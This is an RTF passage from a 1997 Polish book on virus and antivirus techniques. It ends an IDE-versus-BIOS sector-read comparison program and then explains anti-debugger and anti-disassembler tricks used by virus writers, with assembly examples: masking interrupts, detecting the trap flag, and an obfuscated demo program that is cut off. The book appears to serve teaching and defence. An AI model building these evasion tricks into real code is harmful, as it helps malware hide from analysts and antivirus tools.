\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    dx,80h             ; dysk twardy nr 0, glowica 0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    cx,1               ; cylinder 0, sektor 1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    bx,SektorBIOS      ; dokad czytac sektor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    ax,0201h           ; funkcja BIOS - czytaj 1 sektor}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         int    13h                ; wywolaj funkcje BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    bp,TeInne          ; komunikat ze rozne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    cx,256             ; porownaj 256 slow=512 bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    si,SektorIDE       ; bufor z sektorem odczytanym przez porty}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    di,SektorBIOS      ; bufor z sektorem odczytanym przez BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         rep    cmpsw              ; porownaj oba bufory}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jne    Rozne              ; ZF=0 - takie same, ZF=1 - rozne}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lea    bp,TeTakieSame     ; komunikat, ze takie same}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozne:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    si,bp              ; komunikat : rozne lub takie same}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         Call   Druk               ; wyswietl komunikat}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    ax,4C00h           ; funkcja DOS - koncz program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         int    21h                ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Druk:                             ; procedura wyswietla tekst ASCIIZ z CS:SI}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         push   ax si              ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnyZnak:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         lods   byte ptr cs:[si]   ; wez kolejny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         or     al,al              ; czy znak jest zerem ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jz     DrukPowrot         ; TAK = koniec napisu wyjdz z petli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         mov    ah,0Eh             ; funkcja BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         int    10h                ; wyswietl znak (z AL)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         jmp    short NastepnyZnak ; wez nastepny znak}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DrukPowrot:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         pop    si ax              ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch         ret                       ; powrot z procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeCopyRight    db CR,LF,'IDE_PORT v1.0, Autor : Adam Blaszczyk 1997',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeTakieSame    db CR,LF,'_ Odczyt przez IDE-porty = odczyt przez BIOS !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeInne         db CR,LF,'_ Odczyt przez IDE-porty <> odczyt przez BIOS !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeWindows95    db CR,LF,'_ Odczyt przez IDE-porty nie dziala w Windows''95 !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TeIDENieDziala db CR,LF,'_ Odczyt przez IDE-porty nie dziala !',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SektorBIOS db 512/16 dup ('[ SEKTOR BIOS ] ')}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch SektorIDE  db 512/16 dup ('[ SEKTOR EIDE ] ')}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch IDE_PORT ENDS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 9.2. Sztuczki antydebuggerowe, antydeasemblerowe, antyemulacyjne i antyheurystyczne}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby utrudni\uc1\u263\'e6 \uc1\u380\'bfycie programistom pisz\uc1\u261\'b9cym szczepionki oraz zabezpieczy\uc1\u263\'e6 sw\'f3j kod przed niepowo\uc1\u322\'b3anymi osobami, tw\'f3rcy wirus\'f3w (i nie tylko) cz\uc1\u281\'easto u\uc1\u380\'bfywaj\uc1\u261\'b9 tzw. sztuczek antydebuggerowych oraz antydeasemblerowych. Najbardziej znane sztuczki antydebuggerowe polegaj\uc1\u261\'b9 na chwilowym (na czas wykonyw}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0}nia kodu wirusa) blokowaniu przerwa\uc1\u324\'f1 sprz\uc1\u281\'eatowych, co dla osoby pr\'f3buj\uc1\u261\'b9cej analizowa\uc1\u263\'e6 kod programu objawia si\uc1\u281\'ea tym, i\uc1\u380\'bf np. klawiatura przestaje dzia\uc1\u322\'b3a\uc1\u263\'e6 po wykonaniu instrukcji.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\ri-3660\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przeszkadzanie w\uc1\u322\'b3amywaczom polega\uc1\u263\'e6 mo\uc1\u380\'bfe tak\uc1\u380\'bfe na blokowaniu lub chwilowym przejmowaniu przerwa\uc1\u324\'f1 newralgicznych dla dzia\uc1\u322\'b3ania programu uruchomieniowego, a wi\uc1\u281\'eac 0lh (przerwanie trybu krokowego) i 03h (pu\uc1\u322\'b3apka programowa). Ich adresy najcz\uc1\u281\'ea\uc1\u347\'9cciej ustawia si\uc1\u281\'ea na 0FFFFh:0000h, czyli na procedur\uc1\u281\'ea resetuj\uc1\u261\'b9c\uc1\u261\'b9 programowo komputer. Cz\uc1\u281\'easto w tak}{\f1\fs24\lang1045{\*\listtag0}i}{\f0\fs24\lang1045{\*\listtag0}ch wypadkach przejmowane s\uc1\u261\'b9 tak\uc1\u380\'bfe przerwania 21h, 16h, 10h, s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9ce debuggerom do obs\uc1\u322\'b3ugi plik\'f3w, klawiatury, ekranu itd.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Inna metoda przeszkadzania potencjalnym w\uc1\u322\'b3amywaczom polega na tym, i\uc1\u380\'bf wirus pr\'f3buje wykrywa\uc1\u263\'e6 fakt pracowania pod kontrol\uc1\u261\'b9 de-buggera i po ewentualnym wykryciu - wykonywa\uc1\u263\'e6 jak\uc1\u261\'b9\uc1\u347\'9c destrukcyjn\uc1\u261\'b9 operacj\uc1\u281\'ea lub te\uc1\u380\'bf pr\'f3bowa\uc1\u263\'e6 uciec w\uc1\u322\'b3amywaczowi tak, aby ten niczego nie zauwa\uc1\u380\'bfy\uc1\u322\'b3.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Klasycznymi przyk\uc1\u322\'b3adami sztuczek antydebuggerowych s\uc1\u261\'b9 poni\uc1\u380\'bfsze sekwencje:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Blokada przerwa\uc1\u324\'f1 sprz\uc1\u281\'eatowych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AL,0FFh              ; ustaw wszystkie bity w AL na 1 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OUT 21h, AL              ; zamaskuj przerwania sprz\uc1\u281\'eatowe od 0 do 7}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch OUT 0Alh, AL             ; zamaskuj przerwania sprz\uc1\u281\'eatowe od 8 do F Wykrywanie,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; czy kod wykonuje si\uc1\u281\'ea pod kontrola debuggera }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PUSH SS                  ; za\uc1\u322\'b3aduj na stos warto\uc1\u347\'9c\uc1\u263\'e6 SS }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POP SS                   ; po tej instrukcji, nast\uc1\u281\'eapny rozkaz nie jest }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; kontrolowany, }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PUSHF                    ; wi\uc1\u281\'eac mo\uc1\u380\'bfna zachowa\uc1\u263\'e6 na stosie prawdziwe flagi }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POP AX                   ; AX=flagi zdj\uc1\u281\'eate ze stosu }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch TEST AH,1                ; czy bit TF=1 ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNZ DEBUG_ON             ; je\uc1\u347\'9cli tak, to u\uc1\u380\'bfywany jest debugger}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ........                 ; debugger nie jest u\uc1\u380\'bfywany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch DEBUG_ON:                ; debugger jest u\uc1\u380\'bfywany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wr}{\f0\fs24\lang1045{\*\listtag0}az z pojawieniem si\uc1\u281\'ea debugger\'f3w dzia\uc1\u322\'b3aj\uc1\u261\'b9cych w trybie chronionym znaczenie sztuczek anydebuggerowych zmala\uc1\u322\'b3o. Oczywi\uc1\u347\'9ccie, ci\uc1\u261\'b9gle mo\uc1\u380\'bfna je stosowa\uc1\u263\'e6, jednak b\uc1\u281\'ead\uc1\u261\'b9 one raczej nieskuteczne. Na przyk\uc1\u322\'b3ad, je\uc1\u380\'bfeli program pr\'f3buje manipulowa\uc1\u263\'e6 adresami procedur obs\uc1\u322\'b3}{\f1\fs24\lang1045{\*\listtag0}u}{\f0\fs24\lang1045{\*\listtag0}gi przerwa\uc1\u324\'f1 INT l czy INT 3, debugger dzia\uc1\u322\'b3aj\uc1\u261\'b9cy w trybie rzeczywistym oczywi\uc1\u347\'9ccie im ulegnie, natomiast w przypadku debuggera dla trybu chronionego w zasadzie nic si\uc1\u281\'ea nie stanie, gdy\uc1\u380\'bf u\uc1\u380\'bfywa on innej, w\uc1\u322\'b3asnej tablicy przerwa\uc1\u324\'f1.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Aby uniemo\uc1\u380\'bfliwi\uc1\u263\'e6 lub utrudni\uc1\u263\'e6 deasemblacj\uc1\u281\'ea wirusa, stosuje si\uc1\u281\'ea szyfrowanie oraz odpowiednie kombinaqe instrukcji, kt\'f3re zak\uc1\u322\'b3\'f3caj\uc1\u261\'b9 typowy listing programu tak, i\uc1\u380\'bf staje si\uc1\u281\'ea on chaotyczny, nieczytelny i na poz\'f3r bezsensowny (tak jak we wspomnianym we wst\uc1\u281\'eapie wirusie JUMP).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przyk\uc1\u322\'b3adem jest kr\'f3tki programik wy\uc1\u347\'9cwietlaj\uc1\u261\'b9cy po uruchomieniu komunikat Cze\uc1\u347\'9c\uc1\u263\'e6!, a napisany tak, i\uc1\u380\'bf po jego deasemblacji (np. SOUR-CER-em) uzyskuje si\uc1\u281\'ea chaotyczny listing (co ciekawe, podczas kilkakrotnych pr\'f3b otrzymywane \uc1\u378\'9fr\'f3d\uc1\u322\'b3o nie by\uc1\u322\'b3o zawsze takie same).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                  ANTY_DEA v1.0, Autor : Adam Blaszczyk 1997                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Program demonstruje proste techniki antydeasemblerowe         ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Po skompilowaniu mozna sprobowac deasemblowac kod tego        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              programu przy uzyciu np. SOURCERa i porownac z oryginalnym    ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              zrodlem                                                       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Kompilacja :                                                               ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TASM     ANTY_DEA.ASM                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;             TLINK /t ANTY_DEA.OBJ                                          ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ANTY_DEA SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ASSUME CS:ANTY_DEA, DS:ANTY_DEA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch          ORG 100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:                                      ; poczatek programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     sub  bp,bp                              ; zeruj rejestr BP}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     lea  dx,[bp+offset TxCzesc]             ; dostep do danych poprzez}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; adresowanie typowo uzywane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; przy operacjach na stosie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; deasembler moze nie zauwazyc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; ze chodzi o zwykly ofset}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; do tekstu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     jmp  $+4                                ; przeskocz bajt 0EAh}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; i wskocz w drugi bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; rozkazu ADD, czyli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; przejdz do rozkazu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; jmp Koniec}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; (ukrytego w kodzie rozkazu ADD)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     db   0EAh                               ; symuluj wywolanie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; dalekiej procedury}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; o kodzie EA OO OO SS SS, gdzie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; SS SS : Seg, OO OO : ofs}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; mozliwe, ze deasembler pobierze}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                             ; dwuslowo i zamieni je}{\f2\fs24\lang1045{\*\listtag0}\par}
